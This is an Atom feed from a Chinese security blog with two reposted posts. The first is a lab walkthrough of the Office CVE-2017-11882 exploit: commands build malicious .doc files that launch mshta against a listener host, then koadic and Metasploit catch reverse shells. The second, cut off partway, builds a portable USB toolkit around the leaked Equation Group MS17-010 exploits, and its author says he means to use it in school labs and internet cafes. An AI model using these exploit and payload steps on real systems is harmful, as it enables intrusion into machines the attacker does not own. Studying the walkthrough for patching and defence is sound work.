<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yingzhzh&#39;s Notes</title>
  <subtitle>网络安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yingzhzh.github.io/"/>
  <updated>2017-11-28T15:48:27.000Z</updated>
  <id>http://yingzhzh.github.io/</id>
  
  <author>
    <name>Yingzhzh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>cve-2017-11882 漏洞复现和利用</title>
    <link href="http://yingzhzh.github.io/2017/11/28/cve-2017-11882/"/>
    <id>http://yingzhzh.github.io/2017/11/28/cve-2017-11882/</id>
    <published>2017-11-28T15:44:30.000Z</published>
    <updated>2017-11-28T15:48:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="http://www.freebuf.com/vuls/154978.html" target="_blank" rel="external">http://www.freebuf.com/vuls/154978.html</a></p>
<div id="contenttxt"><br>                            <h2>0×01前言</h2><br><p><b style="color: rgb(0, 176, 80);">2017年11月14日微软发布了潜伏17年之久的office远程代码执行漏洞（cve-2017-11882）。该漏洞为office内存破坏漏洞，影响目前流行的office版本。</b></p><br><p><b style="color: rgb(0, 176, 80);">网上的利用方法比较乱，在这儿我将各种方法总结一下。顺便在这儿感谢乱舞大大以及他的团队，信安之路</b></p><br><h2>0×02 漏洞复现</h2><br><blockquote><p>测试环境：win7+kali+office 2007  xp+kali+office 2003</p><br><p>win7 ip:10.10.1.144  xp ip: 10.10.1.126 kali ip 10.10.1.67</p><br></blockquote><br><h3>一． 简单测试弹出计算器（xp)</h3><br><p>1.在kali下执行生成一个含有恶意代码的doc进行测试：</p><br><p><span style="font-size: 12pt;">PythonCommand109b_CVE-2017-11882 -c “cmd.exe /c calc.exe” -o test.doc</span></p><br><p>这条指令的意思是调用cmd并执行calc.exe（即计算器）<a href="http://image.3001.net/images/20171123/15114315718699.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/15114315718699.png!small" src="http://image.3001.net/images/20171123/15114315718699.png!small" alt="1.png" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114315718699.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114315718699.png!small</a>“ alt=”1.png”&gt;&lt;/p&gt;</noscript><br><p>2.在靶机上打开就会弹出计算器：</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20171123/15114315788368.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/15114315788368.png!small" src="http://image.3001.net/images/20171123/15114315788368.png!small" alt="2.png" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114315788368.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114315788368.png!small</a>“ alt=”2.png”&gt;&lt;/p&gt;</noscript><br><a id="more"></a><br><br><h3>二． 通过koadic漏洞复现(xp)</h3><br><p>1.下载koadic并启用</p><br><p><span style="color: rgb(51, 51, 51); font-size: 8.5pt;"><a href="https://github.com/backlion/koadic.git" target="_blank" rel="external">https://github.com/backlion/koadic.git</a></span></p><br><p>2.执行./koadice</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20171123/15114315965536.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/15114315965536.png!small" src="http://image.3001.net/images/20171123/15114315965536.png!small" alt="3.png" width="472" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114315965536.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114315965536.png!small</a>“ alt=”3.png” width=”472” height=”417”&gt;&lt;/p&gt;</noscript><br><p>首先看一下koadic怎么用直接</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20171123/15114316129887.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/15114316129887.png!small" src="http://image.3001.net/images/20171123/15114316129887.png!small" alt="4.png" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114316129887.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114316129887.png!small</a>“ alt=”4.png”&gt;&lt;/p&gt;</noscript><br><p>3.接下来设置shell的接受地址以及端口</p><br><p>Set lhost 10.10.1.67</p><br><p>Set lport 55555</p><br><p>Run</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20171123/15114316234693.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/15114316234693.png!small" src="http://image.3001.net/images/20171123/15114316234693.png!small" alt="5.png" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114316234693.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114316234693.png!small</a>“ alt=”5.png”&gt;&lt;/p&gt;</noscript><br><p>这儿需要注意的是生成的网址需要记住，以方便后面应用</p><br><p>接下来通过poc生成一个含有恶意代码的doc文件</p><br><p>python Command109b_CVE-2017-11882.py -c “mshta<a href="http://10.10.1.67:55555/Ly348" target="_blank" rel="external">http://10.10.1.67:55555/Ly348</a>” -o exploit.doc</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20171123/15114316634199.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/15114316634199.png!small" src="http://image.3001.net/images/20171123/15114316634199.png!small" alt="6.png" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114316634199.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114316634199.png!small</a>“ alt=”6.png”&gt;&lt;/p&gt;</noscript><br><p>接下来在目标主机打开钓鱼文档</p><br><p>切回koadic则发现发生变化</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20171123/15114316899091.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/15114316899091.png!small" src="http://image.3001.net/images/20171123/15114316899091.png!small" alt="7.png" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114316899091.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114316899091.png!small</a>“ alt=”7.png”&gt;&lt;/p&gt;</noscript><br><p>这个时候说明入侵成功并已经反弹shell</p><br><p>接下来在koadic执行zombies 0 切换到项目</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20171123/15114317096191.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/15114317096191.png!small" src="http://image.3001.net/images/20171123/15114317096191.png!small" alt="8.png" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114317096191.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114317096191.png!small</a>“ alt=”8.png”&gt;&lt;/p&gt;</noscript><br><p>接下来用cmdshell模块</p><br><p>输入 cmdshell 0</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20171123/1511431742709.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/images/20171123/1511431742709.png!small" src="http://image.3001.net/images/20171123/1511431742709.png!small" alt="10.png" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/1511431742709.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/1511431742709.png!small</a>“ alt=”10.png”&gt;&lt;/p&gt;</noscript><br><p style="">这就已经进去cmd了接下来可以愉快的玩耍了</p><br><p style="text-align: center;"><img src="http://image.3001.net/images/20171123/15114317579898.png!small" alt="11.png"><img data-original="http://image.3001.net/images/20171123/151143182288.png!small" src="http://image.3001.net/images/20171123/151143182288.png!small" alt="12.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114317579898.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114317579898.png!small</a>“ alt=”11.png”&gt;&lt;img src=”<a href="http://image.3001.net/images/20171123/151143182288.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/151143182288.png!small</a>“ alt=”12.png”&gt;&lt;/p&gt;</noscript><br><h3>三． 通过msf的ps_shell模块 漏洞复现(win7)</h3><br><p>1.启动msf</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114318394619.png!small" src="http://image.3001.net/images/20171123/15114318394619.png!small" alt="13.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114318394619.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114318394619.png!small</a>“ alt=”13.png”&gt;&lt;/p&gt;</noscript><br><p style="">2.查找对应的模块 search PS_shell</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114318534297.png!small" src="http://image.3001.net/images/20171123/15114318534297.png!small" alt="14.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114318534297.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114318534297.png!small</a>“ alt=”14.png”&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114318667038.png!small" src="http://image.3001.net/images/20171123/15114318667038.png!small" alt="15.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114318667038.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114318667038.png!small</a>“ alt=”15.png”&gt;&lt;/p&gt;</noscript><br><p style="">3.利用msf生成利用的powershell脚本</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114319094975.png!small" src="http://image.3001.net/images/20171123/15114319094975.png!small" alt="15.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114319094975.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114319094975.png!small</a>“ alt=”15.png”&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><img src="http://image.3001.net/images/20171123/15114319485930.png!small" alt="16.png"><img src="http://image.3001.net/images/20171123/15114319653746.png!small" alt="17.png"><img src="http://image.3001.net/images/20171123/15114319863292.png!small" alt="18.png"><img data-original="http://image.3001.net/images/20171123/15114320343628.png!small" src="http://image.3001.net/images/20171123/15114320343628.png!small" alt="19.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114319485930.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114319485930.png!small</a>“ alt=”16.png”&gt;&lt;img src=”<a href="http://image.3001.net/images/20171123/15114319653746.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114319653746.png!small</a>“ alt=”17.png”&gt;&lt;img src=”<a href="http://image.3001.net/images/20171123/15114319863292.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114319863292.png!small</a>“ alt=”18.png”&gt;&lt;img src=”<a href="http://image.3001.net/images/20171123/15114320343628.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114320343628.png!small</a>“ alt=”19.png”&gt;&lt;/p&gt;</noscript><br><p>提示一点 在这儿的Command109b_CVE-2017-11882是109字节限制的 当然也有43字节的</p><br><p>1.接接下来在靶机打开测试文档就好</p><br><p>2.切换回kali 会出现</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114320557856.png!small" src="http://image.3001.net/images/20171123/15114320557856.png!small" alt="20.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114320557856.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114320557856.png!small</a>“ alt=”20.png”&gt;&lt;/p&gt;</noscript><br><p>说明已经建立链接了</p><br><p>接下来输入sessions -i 查看一下</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114320788724.png!small" src="http://image.3001.net/images/20171123/15114320788724.png!small" alt="21.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114320788724.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114320788724.png!small</a>“ alt=”21.png”&gt;&lt;/p&gt;</noscript><br><p>接下来切换进入</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114320962976.png!small" src="http://image.3001.net/images/20171123/15114320962976.png!small" alt="22.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114320962976.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114320962976.png!small</a>“ alt=”22.png”&gt;&lt;/p&gt;</noscript><br><p>这个时候就已经入侵到靶机了。</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114321169565.png!small" src="http://image.3001.net/images/20171123/15114321169565.png!small" alt="23.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114321169565.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114321169565.png!small</a>“ alt=”23.png”&gt;&lt;/p&gt;</noscript><br><h3>四． 通过hta_server模块复现(xin7)</h3><br><p>1.在msf搜索hta_server模块</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114321348248.png!small" src="http://image.3001.net/images/20171123/15114321348248.png!small" alt="24.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114321348248.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114321348248.png!small</a>“ alt=”24.png”&gt;&lt;/p&gt;</noscript><br><p style="">2.进行设置</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114321533201.png!small" src="http://image.3001.net/images/20171123/15114321533201.png!small" alt="25.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114321533201.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114321533201.png!small</a>“ alt=”25.png”&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114321778550.png!small" src="http://image.3001.net/images/20171123/15114321778550.png!small" alt="26.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114321778550.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114321778550.png!small</a>“ alt=”26.png”&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114321922706.png!small" src="http://image.3001.net/images/20171123/15114321922706.png!small" alt="27.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114321922706.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114321922706.png!small</a>“ alt=”27.png”&gt;&lt;/p&gt;</noscript><br><p style="">3.在kali上生成带有恶意命令的doc</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114322111342.png!small" src="http://image.3001.net/images/20171123/15114322111342.png!small" alt="28.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114322111342.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114322111342.png!small</a>“ alt=”28.png”&gt;&lt;/p&gt;</noscript><br><p>   4.在靶机上打开test.doc文档 切换回kal</p><br><p>&nbsp;</p><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114322251628.png!small" src="http://image.3001.net/images/20171123/15114322251628.png!small" alt="29.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114322251628.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114322251628.png!small</a>“ alt=”29.png”&gt;&lt;/p&gt;</noscript><br><p style="text-align: center;"><img data-original="http://image.3001.net/images/20171123/15114322416625.png!small" src="http://image.3001.net/images/20171123/15114322416625.png!small" alt="30.png" style="display: inline;"></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/images/20171123/15114322416625.png!small" target="_blank" rel="external">http://image.3001.net/images/20171123/15114322416625.png!small</a>“ alt=”30.png”&gt;&lt;/p&gt;</noscript><br><pre><code class="hljs">（之后的过程就和之前一样了，就不多啰嗦了）。<br></code></pre><br><p>(ps:后两种是利用了powershell，所以在win7下测试的）</p><br><h2>0×03漏洞影响</h2><br><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">“color: rgb(102, 102, 102); font-size: 10pt;”</span>&gt;</span>Office365<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre><br><blockquote><p><span style="color: rgb(102, 102, 102); font-size: 10pt;">MicrosoftOffice 2000</span></p><br><p><span style="color: rgb(102, 102, 102); font-size: 10pt;">MicrosoftOffice 2003</span></p><br><p><span style="color: rgb(102, 102, 102); font-size: 10pt;">MicrosoftOffice 2007 Service Pack 3</span></p><br><p><span style="color: rgb(102, 102, 102); font-size: 10pt;">MicrosoftOffice 2010 Service Pack 2</span></p><br><p><span style="color: rgb(102, 102, 102); font-size: 10pt;">MicrosoftOffice 2013 Service Pack 1</span></p><br><p><span style="color: rgb(102, 102, 102); font-size: 10pt;">MicrosoftOffice 2016</span></p><br></blockquote><br><h2>0×04漏洞修复建议</h2><br><pre><code class="hljs markdown">修复补丁：<a href="span class=&quot;hljs-link&quot;&gt;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882&lt;/span"><span class="hljs-string">&lt;span style=”color: rgb(65, 131, 196); font-size: 10pt;”&gt;&lt;u&gt;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882&lt;/u&gt;&lt;/span&gt;</span></a><br></code></pre><br><p><b style="color: rgb(159, 163, 168);">*本文作者：ls_wen，转载请注明来自FreeBuf.COM</b></p><br>                        </div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文：&lt;a href=&quot;http://www.freebuf.com/vuls/154978.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.freebuf.com/vuls/154978.html&lt;/a&gt;&lt;/p&gt;
&lt;div id=&quot;contenttxt&quot;&gt;&lt;br&gt;                            &lt;h2&gt;0×01前言&lt;/h2&gt;&lt;br&gt;&lt;p&gt;&lt;b style=&quot;color: rgb(0, 176, 80);&quot;&gt;2017年11月14日微软发布了潜伏17年之久的office远程代码执行漏洞（cve-2017-11882）。该漏洞为office内存破坏漏洞，影响目前流行的office版本。&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;b style=&quot;color: rgb(0, 176, 80);&quot;&gt;网上的利用方法比较乱，在这儿我将各种方法总结一下。顺便在这儿感谢乱舞大大以及他的团队，信安之路&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;h2&gt;0×02 漏洞复现&lt;/h2&gt;&lt;br&gt;&lt;blockquote&gt;&lt;p&gt;测试环境：win7+kali+office 2007  xp+kali+office 2003&lt;/p&gt;&lt;br&gt;&lt;p&gt;win7 ip:10.10.1.144  xp ip: 10.10.1.126 kali ip 10.10.1.67&lt;/p&gt;&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;&lt;h3&gt;一． 简单测试弹出计算器（xp)&lt;/h3&gt;&lt;br&gt;&lt;p&gt;1.在kali下执行生成一个含有恶意代码的doc进行测试：&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;span style=&quot;font-size: 12pt;&quot;&gt;PythonCommand109b_CVE-2017-11882 -c “cmd.exe /c calc.exe” -o test.doc&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;这条指令的意思是调用cmd并执行calc.exe（即计算器）&lt;a href=&quot;http://image.3001.net/images/20171123/15114315718699.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/images/20171123/15114315718699.png!small&quot; src=&quot;http://image.3001.net/images/20171123/15114315718699.png!small&quot; alt=&quot;1.png&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/images/20171123/15114315718699.png!small&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/images/20171123/15114315718699.png!small&lt;/a&gt;“ alt=”1.png”&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;2.在靶机上打开就会弹出计算器：&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/images/20171123/15114315788368.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/images/20171123/15114315788368.png!small&quot; src=&quot;http://image.3001.net/images/20171123/15114315788368.png!small&quot; alt=&quot;2.png&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/images/20171123/15114315788368.png!small&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/images/20171123/15114315788368.png!small&lt;/a&gt;“ alt=”2.png”&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="http://yingzhzh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="CVE-2017-11882" scheme="http://yingzhzh.github.io/tags/CVE-2017-11882/"/>
    
      <category term="office漏洞" scheme="http://yingzhzh.github.io/tags/office%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="hta利用" scheme="http://yingzhzh.github.io/tags/hta%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>利用Pentestbox打造MS17-010移动&quot;杀器&quot;</title>
    <link href="http://yingzhzh.github.io/2017/09/07/pentestbox-ms17010/"/>
    <id>http://yingzhzh.github.io/2017/09/07/pentestbox-ms17010/</id>
    <published>2017-09-07T15:02:40.000Z</published>
    <updated>2017-09-07T15:09:54.000Z</updated>
    
    <content type="html"><![CDATA[<div id="contenttxt"><br>                            <p><span style="color: rgb(239, 71, 71);"><b><em></em></b></span><span style="color: rgb(239, 71, 71);"><b>本文原创作者：ssooking，本文属FreeBuf原创奖励计划，未经许可禁止转载</b></span></p><br><h2>一. 前言</h2><br><p><b style="color: rgb(0, 176, 80);">前段时间Shadow Broker披露了 Windows大量漏洞，甚至爆出黑客组织 Equation Group 对于Windows 远程漏洞 MS17-010 的利用工具，该漏洞影响范围之广，堪称杀器。可以看看官方通告。大伙们也忙的热火朝天~~于是想着把攻击环境移植到u盘里，然后比如去学校机房，网吧。</b></p><br><p>这里分享一下个人的移植过程，以及在使用攻击代码过程中遇到的问题，思路就是利用现成的神器pentestbox，向里添加攻击代码以及其运行需要的python环境。</p><br><h2>二. 环境移植过程</h2><br><p>Pentest Box是一款Windows平台下预配置的便携式开源渗透测试环境，集成了各种编译运行环境，具体的可以到网上了解一下。</p><br><h3>1. &nbsp;工具准备：</h3><br><p>Pentestbox:</p><br><p><a href="https://pentestbox.org/zh/" target="_blank" rel="external">https://pentestbox.org/zh/</a></p><br><p>方程式工具包: EQGRP_Lost_in_Translation</p><br><p><a href="https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master" target="_blank" rel="external">https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master</a></p><br><p>python环境</p><br><p>必须在Python2.6 &nbsp;和 pywin32-221环境下，如果你用其他环境，会报各种诸如模块/dll缺失等错误</p><br><p><a href="http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png" src="http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png" alt="" style="display: inline;"></a>    </p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png" target="_blank" rel="external">http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png</a>“ alt=””&gt;    &lt;/p&gt;</noscript><br><p>Python2.6 &nbsp;和 pywin32-221位数需要相同，我用的是32位的</p><br><p>Python2.6.6 （32）&nbsp;</p><br><p>下载链接：<a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="external">https://www.python.org/download/releases/2.6.6/</a></p><br><p>pywin32-221（32）</p><br><p>下载链接：</p><br><p><a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download" target="_blank" rel="external">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download</a></p><br><h3>2. &nbsp;Pentestbox下python2.6环境配置</h3><br><p>分别安装，然后你会得到攻击包运行的python2.6环境</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png" src="http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png" alt="" style="display: inline;"></a>    </p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png" target="_blank" rel="external">http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png</a>“ alt=””&gt;    &lt;/p&gt;</noscript><br><p>在Python26\Lib\site-packages目录下，你会发现插件也已经安装    </p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png" src="http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png" target="_blank" rel="external">http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>然后把python26这个文件夹拷贝到你的pentestbox环境变量目录下：Pentestbox\base</p><br><p>刚才你也可以直接装到pentestbox\base下</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png" src="http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png" target="_blank" rel="external">http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>然后我们添加python2.6环境变量,在Pentestbox \config\alias文件中加一行</p><br><p>python26=”%pentestbox_ROOT%\base\Python26\python.exe” $</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png" src="http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png" target="_blank" rel="external">http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>然后我们启动pentestbox，由于pentestbox通过线程注入挂钩cmd.exe来调用系统命令，因此杀软可能会提示警告，信任即可。    </p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png" src="http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png" target="_blank" rel="external">http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>这个时候，我们运行python26可以看到环境配置成功</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png" src="http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png" alt="" style="display: inline;"></a></p><br><noscript>&lt;img src=”<a href="http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png" target="_blank" rel="external">http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png</a>“ alt=””&gt;&lt;/p&gt;</noscript><br><p>3. 漏洞利用工具配置</p><br><p>我们下载EQGRP_Lost_in_Translation工具包,修改windows目录下fb.py，去除不必要的代码</p><br><p style="text-align: center;"><a href="http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png" 